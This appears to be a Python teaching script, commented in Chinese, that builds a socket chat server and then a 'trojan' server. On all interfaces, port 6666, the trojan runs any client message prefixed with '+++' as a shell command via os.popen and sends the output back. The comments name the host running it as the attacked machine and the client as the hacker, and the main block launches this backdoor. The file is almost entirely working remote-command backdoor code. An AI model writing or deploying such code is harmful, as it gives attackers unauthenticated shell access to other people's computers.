import socket,os

def normal_talk():
    try:
        server_socket = socket.socket()
        # server_socket.bind(('127.0.0.1',6666))  # 绑定127.0.0.1表示，只有本机的客户端才可以访问该服务器
        # server_socket.bind(('0.0.0.0',6666))  # 绑定 0.0.0.0 表示，所有客户端ip地址都可以访问该服务器
        server_socket.bind(('192.168.1.178', 6666))
        server_socket.listen()
        chanel, client = server_socket.accept()
        while True:
            # chanel,client = server_socket.accept()  # 接受客户端连接  返回的是新的套接字，表示的是客户端的套接字
            # 调用 accept() 这个函数时，执行一次就会进入阻塞状态
            # 因为调用一次表示已经有一个客户端发送过消息，而 accept 会等待下一个客户端连接并发送消息，因此就会将上一个客户阻塞
            message = chanel.recv(1024).decode()
            print(f"收到来自客户端的数据：{message}")
            replay = message.replace("吗？", "!").encode()
            chanel.send(replay)
    except:
        server_socket.close()
        normal_talk()

    # chanel.close()  # 死循环之后的代码是不可达的


#核心思路：客户端发送一条特殊字符数据，里面包含要执行的指令，让服务器执行指令并将结果返回给客户端
# 启动木马服务器端的电脑是被攻击主机，木马的客户端启用者是hacker
def attack_talk():
    try:
        server_socket = socket.socket()
        server_socket.bind(('0.0.0.0', 6666))
        server_socket.listen()
        chanel, client = server_socket.accept()  # 放在外面是防止accept的阻塞
        while True:
                message = chanel.recv(1024).decode()  # 先获取客户端发送的消息，判断如果数据是由 +++ 开头的，则说明这是一个指令，我需要执行该指令，并返回指令的运行结果
                if message.startswith('+++'):
                    command = message.split(',')[-1]
                    replay = os.popen(command).read()
                    chanel.send(f"命令{command}的运行结果：\n{replay}".encode())
                else:  # 否则就正常服务器与客户端对话
                    print(f"收到来自客户端的数据：{message}")
                    replay = message.replace("吗？", "!").encode()
                    chanel.send(replay)
    except:  # 这样是为了防止一个客户端断开连接时导致服务器连接也强制断开 如下我们可以确保服务器连接一直开着，且使得一个客户断开不会使得服务器也断开
        server_socket.close()
        attack_talk()

if __name__ == '__main__':
    # normal_talk()
    attack_talk()
